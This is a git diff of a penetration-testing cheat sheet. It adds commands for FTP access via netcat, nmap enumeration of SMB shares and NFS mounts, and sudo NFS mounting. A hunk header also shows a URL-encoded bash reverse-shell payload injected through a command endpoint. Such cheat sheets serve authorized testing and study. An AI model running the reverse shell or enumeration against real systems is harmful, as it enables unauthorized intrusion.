@@ -286,6 +286,9 @@ http://example.com/api/cmd/bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{LOCAL_IP}%2F{LOC
 
 ```
 # Access
+nc {TARGET} 21
+
+# Access
 ftp {TARGET}
 
 # Download file to current directory
@@ -302,6 +305,9 @@ ftp> pwd
 # SMB
 
 ```
+# Nmap Analysis
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse {TARGET}
+
 # Disks list
 smbmap -H {TARGET}
 
@@ -369,19 +375,23 @@ mysql> SELECT {FIELD_1},{FIELD_2} FROM {TABLE};
 ### List Mount Points
 
 ```
+# Nmap Analysis
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount {TARGET}
+
+# Showmount
 showmount -e {TARGET}
 ```
 
 ### Mount
 
 ```
-mount {TARGET}:{MOUNT_POINT} {LOCAL_PATH}
+sudo mount -t nfs {TARGET}:{MOUNT_POINT} {LOCAL_PATH}
 ```
 
 ### Umount
 
 ```
-umount {LOCAL_PATH}
+sudo umount {LOCAL_PATH}
 ```
 
 # RDP
